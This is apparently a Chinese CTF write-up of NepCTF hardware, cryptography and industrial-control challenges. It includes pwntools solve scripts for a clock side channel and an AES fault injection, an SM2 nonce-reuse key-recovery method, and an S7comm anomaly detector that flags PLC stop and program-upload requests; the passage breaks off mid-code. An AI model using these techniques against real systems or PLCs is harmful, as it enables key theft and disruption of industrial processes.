<p>具体到这个题目，给出了一个基准电路图，并指定了采样位置在DFF的输出，因此在电路结构上不需要做更多的分析，仅需要考虑transition泄露；根据时钟波形我们可以发现，高电平对应3.3v，低电平对应0v，时钟不是理想方波，setup time与hold time不为0，于是我们可以搜集到过渡态信息。此外还可以注意到采样率是500e6，时钟频率是4e6，于是每个cycle有125个采样点。</p>
<p>再来看噪声情况。分别搜集100*50组绝对在高电平和低电平的数据进行测量发现数据噪声水平标准差差在3%左右，考虑到样点数量32，不太大，取左右各3个标准差即10%应该可以过。</p>
<p>最后看信号，信号的采样频率与时钟频率均保持一致，可以用时钟信号进行估计。根据噪声找[0,1]过渡点在四分位的左右的情况最合适。每个cycle有125个采样点，在时钟信号125n的前后十个点中进行分析，发现+3位置的均值比较符合四分位，于是进行在线测试，能用，脚本如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from tqdm import *</span><br><span class="line">io=remote(&quot;nepctf31-6fnh-qxsh-eprh-yhtcgrorn582.nepctf.com&quot;,&quot;443&quot;,ssl=True)</span><br><span class="line"></span><br><span class="line">l=64</span><br><span class="line"></span><br><span class="line">data=[]</span><br><span class="line">for i in tqdm(range(1,l,2)):</span><br><span class="line">    #pos=int(i*int(500/4))+3</span><br><span class="line">    pos=125*i+2</span><br><span class="line">    io.recvuntil(b&quot;&gt;&quot;)</span><br><span class="line">    io.sendline(b&quot;1&quot;)</span><br><span class="line">    io.recvuntil(b&quot;&gt;&quot;)</span><br><span class="line">    io.sendline(str(pos).encode())</span><br><span class="line">    v=eval(io.recvline())</span><br><span class="line">    print(v/3.3)</span><br><span class="line">    if abs((v-0)/(3.3-0)-0.0)&lt;0.10:</span><br><span class="line">       data+=([0,0]) </span><br><span class="line">    elif abs((v-0)/(3.3-0)-0.2)&lt;0.10:</span><br><span class="line">       data+=([0,1]) </span><br><span class="line">    elif abs((v-0)/(3.3-0)-0.8)&lt;0.10:</span><br><span class="line">       data+=([1,0]) </span><br><span class="line">    elif abs((v-0)/(3.3-0)-1.0)&lt;0.10:</span><br><span class="line">       data+=([1,1])</span><br><span class="line">    else :</span><br><span class="line">       print(&quot;wrong&quot;)   </span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;&gt;&quot;)</span><br><span class="line">io.sendline(b&quot;2&quot;)</span><br><span class="line">        </span><br><span class="line">for i in range(l):</span><br><span class="line">    print(io.recvuntil(b&quot;&gt;&quot;))</span><br><span class="line">    io.sendline(str(data[i]).encode())</span><br><span class="line">print(io.recvline())</span><br><span class="line">print(io.recvline())</span><br></pre></td></tr></table></figure></div>

<p>另附模拟脚本</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.io import savemat</span><br><span class="line">import random</span><br><span class="line">from time import time_ns</span><br><span class="line">def generate_clock_signal_with_slack(sampling_rate, signal_frequency, num_cycles, output_file,high_level=3.3, low_level=0,slack_time=2e-8):</span><br><span class="line">    # 每个周期的采样点数</span><br><span class="line">    samples_per_cycle = int(sampling_rate / signal_frequency)</span><br><span class="line"></span><br><span class="line">    # 总的采样点数</span><br><span class="line">    total_samples = num_cycles * samples_per_cycle</span><br><span class="line"></span><br><span class="line">    # 生成时间轴</span><br><span class="line">    t = np.linspace(0, num_cycles / signal_frequency, total_samples, endpoint=False)</span><br><span class="line"></span><br><span class="line">    # Slack对应的采样点数</span><br><span class="line">    slack_samples = int(slack_time * sampling_rate)</span><br><span class="line"></span><br><span class="line">    # 生成信号</span><br><span class="line">    signal = np.zeros(total_samples)</span><br><span class="line">    last_state = signal[0]</span><br><span class="line">    next_state = signal[0]</span><br><span class="line">    trans = 0</span><br><span class="line"></span><br><span class="line">    for i in range(1, total_samples):</span><br><span class="line">        cycle_position = (i % samples_per_cycle) % (samples_per_cycle // 2)</span><br><span class="line">        if cycle_position == 0:</span><br><span class="line">            trans = 1</span><br><span class="line">            next_state = 1 - last_state</span><br><span class="line">        if trans == 1:</span><br><span class="line">            signal[i] = (next_state - last_state) * (cycle_position) / slack_samples + last_state</span><br><span class="line">        if cycle_position == slack_samples:</span><br><span class="line">            trans = 0</span><br><span class="line">            last_state = next_state</span><br><span class="line">        if trans == 0:</span><br><span class="line">            signal[i] = last_state</span><br><span class="line"></span><br><span class="line">    # 调整信号幅值</span><br><span class="line">    signal=  signal + np.random.normal(loc=0.0, scale=0.03, size=total_samples)</span><br><span class="line">    signal = signal * (high_level - low_level) + low_level</span><br><span class="line"></span><br><span class="line">    # 保存信号到.mat文件</span><br><span class="line">    savemat(output_file, &#123;&quot;clock_signal&quot;: signal&#125;)</span><br><span class="line"></span><br><span class="line">def generate_serialdata_with_slack(sampling_rate, signal_frequency, data, output_file,high_level=3.3, low_level=0,slack_time=2e-8):</span><br><span class="line">    # 每个周期的采样点数</span><br><span class="line">    samples_per_cycle = int(sampling_rate / signal_frequency)</span><br><span class="line"></span><br><span class="line">    # 总的采样点数</span><br><span class="line">    </span><br><span class="line">    num_cycles=len(data)</span><br><span class="line">    data=[0]+data</span><br><span class="line">    total_samples = num_cycles * samples_per_cycle</span><br><span class="line"></span><br><span class="line">    # 生成时间轴</span><br><span class="line">    t = np.linspace(0, num_cycles / signal_frequency, total_samples, endpoint=False)</span><br><span class="line"></span><br><span class="line">    # Slack对应的采样点数</span><br><span class="line">    slack_samples = int(slack_time * sampling_rate)</span><br><span class="line"></span><br><span class="line">    # 生成信号</span><br><span class="line">    signal = np.zeros(total_samples)</span><br><span class="line">    last_state = data[1]</span><br><span class="line">    next_state = data[1]</span><br><span class="line">    trans = 0</span><br><span class="line">    count=0</span><br><span class="line">    for i in range(0, total_samples):</span><br><span class="line">        cycle_position = (i % samples_per_cycle) </span><br><span class="line">        if cycle_position == 0:</span><br><span class="line">            trans = 1</span><br><span class="line">            next_state =data[count+1] </span><br><span class="line">        if trans == 1:</span><br><span class="line">            signal[i] = (next_state - last_state) * (cycle_position) / slack_samples + last_state</span><br><span class="line">        if cycle_position == slack_samples:</span><br><span class="line">            trans = 0</span><br><span class="line">            last_state = next_state</span><br><span class="line">            count+=1</span><br><span class="line">        if trans == 0:</span><br><span class="line">            signal[i] = last_state</span><br><span class="line"></span><br><span class="line">    # 调整信号幅值</span><br><span class="line">    #rng=np.random.default_rng(seed=random.getrandbits(128))</span><br><span class="line">    #signal=  signal + rng.normal(loc=0.0, scale=0.03, size=total_samples)</span><br><span class="line">    np.random.seed(int(time_ns())%(2**32))</span><br><span class="line">    signal=  signal + np.random.normal(loc=0.0, scale=0.03, size=total_samples)</span><br><span class="line">    signal = signal * (high_level - low_level) + low_level</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    plt.figure(figsize=(10, 6))</span><br><span class="line">    plt.plot(t[:samples_per_cycle * 10], signal[:samples_per_cycle * 10])  # 仅绘制前10个周期</span><br><span class="line">    plt.title(&quot;Clock Signal with Slack&quot;)</span><br><span class="line">    plt.xlabel(&quot;Time (s)&quot;)</span><br><span class="line">    plt.ylabel(&quot;Voltage (V)&quot;)</span><br><span class="line">    plt.grid()</span><br><span class="line">    plt.show()</span><br><span class="line">    #&#x27;&#x27;&#x27;</span><br><span class="line">    # 保存信号到.mat文件</span><br><span class="line">    savemat(output_file, &#123;&quot;data&quot;: signal&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 示例调用</span><br><span class="line">sample_clock=generate_clock_signal_with_slack</span><br><span class="line">sample_serialdata=generate_serialdata_with_slack</span><br><span class="line">from random import randint</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    generate_clock_signal_with_slack(</span><br><span class="line">    sampling_rate=500e6,</span><br><span class="line">    signal_frequency=4e6,</span><br><span class="line">    num_cycles=100,</span><br><span class="line">    output_file=&quot;clock_signal.mat&quot;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    data=[randint(0,1) for i in range(10)]</span><br><span class="line">    print(data)</span><br><span class="line">    generate_serialdata_with_slack(</span><br><span class="line">    sampling_rate=500e6,</span><br><span class="line">    signal_frequency=4e6,</span><br><span class="line">    data=data,</span><br><span class="line">    output_file=&quot;serial_data.mat&quot;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是现实中的asic器件以及大部分现代FPGA的时钟信号整齐程度往往比这个高，于是本方案仅为题目模拟建模，不承担任何对实际具体部件的模拟职能。</p>
<h2 id="unloopshock"><a href="#unloopshock" class="headerlink" title="unloopshock"></a><strong>unloopshock</strong></h2><p>故障注入在密钥迭代处，保证在copy完4个主密钥后，如果将计数器打飞到超过44，这样的话就会溢出一个轮密钥，然后截止运算，其他轮密钥位均为0。那么这时如果加密了一组明文m，事实上就是m^k这个明文过了轮密钥全0的AES加密过程，也就意味着对得到的密文用轮密钥全0解密一遍再异或掉m，得到的就是k。需要注意这个打分计数器是有概率的。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#找了一个在线AES</span><br><span class="line">#https://github.com/caodong0225/USST_Cyber_Safety/blob/68ef7acd91cb8fa5fb9e433c2a610b4db1c2d43d/AES/crypto.py</span><br><span class="line">from pwn import *</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    aes = AES()</span><br><span class="line">    key = 0xd31f93c7b0d7dcea856a204c3f8d8ba0</span><br><span class="line">    RoundKeys = aes.round_key_generator(key)</span><br><span class="line">    #io=process([&quot;python&quot;,&quot;main.py&quot;])</span><br><span class="line">    io=remote(&quot;nepctf31-wr49-vykn-0vaa-anqexwzqm530.nepctf.com&quot;,&quot;443&quot;,ssl=True)</span><br><span class="line">    io.recvuntil(b&quot;in hex(max 16 bytes)\n&quot;)</span><br><span class="line">    io.sendline(b&quot;00&quot;*16)</span><br><span class="line">    io.recvuntil(b&quot;shock: &quot;)</span><br><span class="line">    io.sendline(b&quot;90&quot;)</span><br><span class="line">    io.recvuntil(b&quot;Result:  &quot;)</span><br><span class="line">    c=io.recvline()</span><br><span class="line">    io.recvuntil(b&quot;key: &quot;)</span><br><span class="line">    # 解密</span><br><span class="line">    #ciphertext = 0xb3fd8070214898e2eb86300dcb53306d</span><br><span class="line">    ciphertext =int(c,16)</span><br><span class="line">    RoundKeys=[bytes([0]*16)]*len(RoundKeys)</span><br><span class="line">    ciphertext = aes.num_2_16bytes(ciphertext)</span><br><span class="line">    plaintext = aes.aes_decrypt(ciphertext, RoundKeys)</span><br><span class="line">    print(&#x27;plaintext = &#x27; + hex(aes._16bytes2num(plaintext)))</span><br><span class="line">    ans=hex(aes._16bytes2num(plaintext))[2:].zfill(32)</span><br><span class="line">    print(ans)</span><br><span class="line">    io.sendline(ans.encode())</span><br><span class="line">    print(io.recvline())</span><br></pre></td></tr></table></figure></div>

<h2 id="国产密码应用"><a href="#国产密码应用" class="headerlink" title="国产密码应用"></a><strong>国产密码应用</strong></h2><p>这题是根据实际的密码测评中可能会遇到的密码应用场景进行出题的，其实涉及到的知识点并不难，可能是这类题目比较少见，所以最后大家都没做出来🌚</p>
<p>由于这题是零解，脚本我就不放了，说一下解题思路：</p>
<p>1、TLCP采用的算法是ECC_SM4_CBC_SM3。题目并没有给出预主密钥，而是说密码应用都存在一些小问题。无非就那么几个，随机数不随机，密钥硬编码等等。这道题主要是考察随机数不随机的问题。从密钥来看，服务端发送了两个证书，一个是签名，一个是加密，所以现在用到的密钥只有：服务端的签名密钥对，和加密密钥对。看数据库表，是SM2加密数据，明文也给了，因此加密密钥对用在这里。在TLCP中，ClientKeyExchange里，加密预主密钥，用到了服务器的加密密钥对。ServerKeyExchange中，用到了签名密钥对进行签名。最终flag是在加密的对话当中的。 2、结合以上情况我们得知，要解密TLCP。那么就需要解密预主密钥。现在用到加密密钥对的只有加密预主密钥和数据库表。仔细的人可以发现，用SM2密钥加密的预主密钥密文，得到的前64字节和数据库表中序号4的密文的是一样的。根据SM2加密流程，可知若C1一致，则t也一致。C2&#x3D;t异或明文。那么我们可以通过序号4的明文异或C2，得到46字节的t。但是预主密钥的密文C2有48字节，则需要自己再爆破两个字节，最后可以得到预主密钥。 3、根据预主密钥可以解密出得到所有的对应密钥，通过writekey和IV解密出对应的会话内容。仔细的人会发现，有些会话的client random一样，这个其实不是重点。其他会话传输的数据都是数据库中的SM2密文，但倒数第二个会话中内容与数据库表中的密文都不一样。因此答案很大可能在这里。但是我们没有SM2的加密私钥，C1也不一样，解密不了。此时签名密钥还没用，其实这里是系统对密钥用途误用，把签名私钥用来加密了。所以我们要获取签名密钥对的私钥。此时结合题目中的提示，很大可能是生成随机数的密码模块均生成了相同的随机数。那么我们可以通过两个不同的签名，来反推得到最后的签名私钥。签名私钥算出来后，对数据进行解密，即可得到最终的flag。</p>
<p>总结一下该系统存在的一些问题： 1.SM2加密随机数k重用 2.SM2签名随机数k重用 3.证书密钥用途误用，用签名证书进行加密。 4.TLCP服务端和客户端随机数重用 5.数据库第四条记录存储的是十六进制，其他是存的字符串 6.数据库第二条记录连带回车字符一起加密 …… （关键在前三条，第1,2条提示中已经给了，第3条需要自己分析一下）</p>
<h1 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a><strong>ICS</strong></h1><h2 id="薯饼的PLC"><a href="#薯饼的PLC" class="headerlink" title="薯饼的PLC"></a><strong>薯饼的PLC</strong></h2><p>这题的本意是考察存储区的数据读写的签到题。使用WireShark很容易看出读写的区块。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgT2UYlrRpumC3r7TEGTpr0tianCpfhTHrf2iciccyEiah653ZibDdYpuicuLQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>以及对应的数据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgRzMo5QmCdMic5ib25unqAR3ibvVU1LPPsluViavKoWMw7vgep72ZLg0Llg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>因此，可以将读取的区块和数据都用tshark提取出来。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\Program Files\Wireshark\tshark.exe&quot; -r &quot;E:/download.pcap&quot; -d tcp.port==11102,tpkt -T json -e s7comm.resp.data -e s7comm.param.item.db &gt; E:/1.json</span><br></pre></td></tr></table></figure></div>

<p>在分析数据包的时候，可以发现数据其实存在一些扰动，但他们读写的是不同的DB，因此需要针对DB进行筛选。很容易发现有效数据都在DB 1002，将这些数据成对处理。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line"># Convert binary to ASCII</span><br><span class="line">def binary_to_ascii(binary):</span><br><span class="line">    # Split binary string into 8-bit chunks</span><br><span class="line">    bytes_list = [binary[i:i+8] for i in range(0, len(binary), 8)]</span><br><span class="line">    # Convert each 8-bit chunk to ASCII character</span><br><span class="line">    ascii_string = &#x27;&#x27;.join(chr(int(byte, 2)) for byte in bytes_list)</span><br><span class="line">    return ascii_string</span><br><span class="line"></span><br><span class="line">data = json.loads(open(&quot;2.json&quot;, &quot;r&quot;).read())</span><br><span class="line">result = []</span><br><span class="line">flag = False</span><br><span class="line">for datum in data:</span><br><span class="line">    source = datum[&quot;_source&quot;]</span><br><span class="line">    ifnot source.get(&quot;layers&quot;):</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    # Safely check for s7comm.param.item.db</span><br><span class="line">    layers = source[&quot;layers&quot;]</span><br><span class="line">    if (</span><br><span class="line">        layers.get(&quot;s7comm.param.item.db&quot;) and</span><br><span class="line">        isinstance(layers[&quot;s7comm.param.item.db&quot;], list) and</span><br><span class="line">        layers[&quot;s7comm.param.item.db&quot;] and</span><br><span class="line">        layers[&quot;s7comm.param.item.db&quot;][0] == &quot;1002&quot;</span><br><span class="line">    ):</span><br><span class="line">        flag = True</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    # Safely check for s7comm.resp.data and append to result</span><br><span class="line">    if (</span><br><span class="line">        layers.get(&quot;s7comm.resp.data&quot;) and</span><br><span class="line">        isinstance(layers[&quot;s7comm.resp.data&quot;], list) and</span><br><span class="line">        layers[&quot;s7comm.resp.data&quot;] and flag</span><br><span class="line">    ):</span><br><span class="line">        if layers[&quot;s7comm.resp.data&quot;][0] == &quot;30&quot;:</span><br><span class="line">            result.append(&quot;0&quot;)</span><br><span class="line">        elif layers[&quot;s7comm.resp.data&quot;][0] == &quot;31&quot;:</span><br><span class="line">            result.append(&quot;1&quot;)</span><br><span class="line">        else:</span><br><span class="line">            result.append(&quot;0&quot;)</span><br><span class="line">        flag = False</span><br><span class="line"></span><br><span class="line">binary_string = &quot;&quot;.join(result)</span><br><span class="line"># Optional: Print or save the result</span><br><span class="line">print(binary_to_ascii(binary=binary_string))</span><br></pre></td></tr></table></figure></div>

<h2 id="Factory-水罐-SIEM"><a href="#Factory-水罐-SIEM" class="headerlink" title="Factory - 水罐 SIEM"></a><strong>Factory - 水罐 SIEM</strong></h2><p>这题本意是考察ICS中安全设备针对实时流量和日志进行审计的过程，因此选取了S7comm一种协议的四种控制逻辑进行随机流量生成。主要有如下接近10个点位二十几种情形的非正常行为：</p>
<ol>
<li>读写架号错误，尝试读写不属于此过程的Slot；</li>
<li>读写Item的Syntax错误；</li>
<li>读写的位数错误，在一个位有效的位置读取或写入一个字节或者一个字，造成非正常的存储区数据变更；</li>
<li>读写DB号错误，尝试读取不属于此过程的DB；</li>
<li>读写地址错误，越界读写其他变量；</li>
<li>包构造错误；</li>
<li>处于过程边缘（水罐将要溢出已经关闸）的时候反复触发非正常状态（开闸）；</li>
<li>尝试关闭PLC；</li>
<li>尝试下载新的控制程序。</li>
</ol>
<p>因此只需要写一个协议栈（协议栈有很多代码，就不在这里贴了，WireShark和Snap7的开源项目可供参考），然后根据给出的描述实现一个检测方法应对这几种异常就完成了。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">import ast</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">from protocol.TPKTProtocol import TPKTProtocol</span><br><span class="line">from protocol.cotp_clz0.COTPProtocol import COTPProtocol</span><br><span class="line">from protocol.cotp_clz0.pdu import COTPPduData</span><br><span class="line">from protocol.s7comm.S7commProtocol import S7commProtocol</span><br><span class="line">from protocol.s7comm.data.S7commEmptyData import S7commEmptyData</span><br><span class="line">from protocol.s7comm.data.job.S7commWriteVariableJobData import S7commWriteVariableJobData</span><br><span class="line">from protocol.s7comm.enum.S7commItemAreaEnum import S7commItemAreaEnum</span><br><span class="line">from protocol.s7comm.enum.S7commItemReturnCodeEnum import S7commItemReturnCodeEnum</span><br><span class="line">from protocol.s7comm.enum.S7commItemSyntaxIdEnum import S7commItemSyntaxIdEnum</span><br><span class="line">from protocol.s7comm.enum.S7commItemTransportSizeParameterEnum import S7commItemTransportSizeParameterEnum</span><br><span class="line">from protocol.s7comm.item.job import S7commReadVariableParameterJobItem, S7commWriteVariableDataJobItem, \</span><br><span class="line">    S7commWriteVariableParameterJobItem</span><br><span class="line">from protocol.s7comm.parameter.job.S7commPlcStopJobParameter import S7commPlcStopJobParameter</span><br><span class="line">from protocol.s7comm.parameter.job.S7commReadVariableJobParameter import S7commReadVariableJobParameter</span><br><span class="line">from protocol.s7comm.parameter.job.S7commUploadJobParameter import S7commUploadJobParameter</span><br><span class="line">from protocol.s7comm.parameter.job.S7commWriteVariableJobParameter import S7commWriteVariableJobParameter</span><br><span class="line">from protocol.s7comm.pdu.S7commJobPdu import S7commJobPdu</span><br><span class="line"></span><br><span class="line">def parse_check(packet: bytes, hasPrefix=False):</span><br><span class="line">    evil = False</span><br><span class="line">    depth = b&quot;\x02&quot;</span><br><span class="line">    overflow = b&quot;\x00&quot;</span><br><span class="line">    actuator = b&quot;\x01&quot;</span><br><span class="line">    packetTPKT = None</span><br><span class="line">    packetCOTP = None</span><br><span class="line">    packetS7comm = None</span><br><span class="line">    if hasPrefix:</span><br><span class="line">        depth = packet[0]</span><br><span class="line">        overflow = packet[1]</span><br><span class="line">        actuator = packet[2]</span><br><span class="line">        packet = packet[3:]</span><br><span class="line">    try:</span><br><span class="line">        packetTPKT = TPKTProtocol.parse(packet)</span><br><span class="line">        packetCOTP = COTPProtocol.parse(packetTPKT.data)</span><br><span class="line">        assert packetCOTP.tPduNumber == 0</span><br><span class="line">        packetS7comm = S7commProtocol.parse(packetCOTP.userData)</span><br><span class="line">        packetS7comm: S7commJobPdu</span><br><span class="line">        assert packetS7comm.dataUnitReference == 2300</span><br><span class="line">        parameter = packetS7comm.parameter</span><br><span class="line">        if type(parameter) is S7commPlcStopJobParameter or type(parameter) is S7commUploadJobParameter:</span><br><span class="line">            raise</span><br><span class="line">        if type(parameter) is S7commWriteVariableJobParameter or type(parameter) is S7commReadVariableJobParameter:</span><br><span class="line">            data = parameter.items</span><br><span class="line">            for item in data:</span><br><span class="line">                item: S7commReadVariableParameterJobItem</span><br><span class="line">                assert item.syntaxId == S7commItemSyntaxIdEnum.S7Any</span><br><span class="line">                assert item.area == S7commItemAreaEnum.DB</span><br><span class="line">                assert item.readLength == 1</span><br><span class="line">                assert item.dbNumber == 1002</span><br><span class="line">                assert item.transportSize in [S7commItemTransportSizeParameterEnum.Bit,</span><br><span class="line">                                              S7commItemTransportSizeParameterEnum.Byte,</span><br><span class="line">                                              S7commItemTransportSizeParameterEnum.Word]</span><br><span class="line">                assert0x001f50 &lt;= item.address &lt;= 0x002f70</span><br><span class="line">        if type(parameter) is S7commWriteVariableJobParameter:</span><br><span class="line">            data = packetS7comm.data</span><br><span class="line">            data: S7commWriteVariableJobData</span><br><span class="line">            parameter = packetS7comm.parameter</span><br><span class="line">            parameter: S7commWriteVariableJobParameter</span><br><span class="line">            ditems = data.items</span><br><span class="line">            ditems: S7commWriteVariableDataJobItem</span><br><span class="line">            pitems = parameter.items</span><br><span class="line">            pitems: S7commWriteVariableParameterJobItem</span><br><span class="line">            for x in 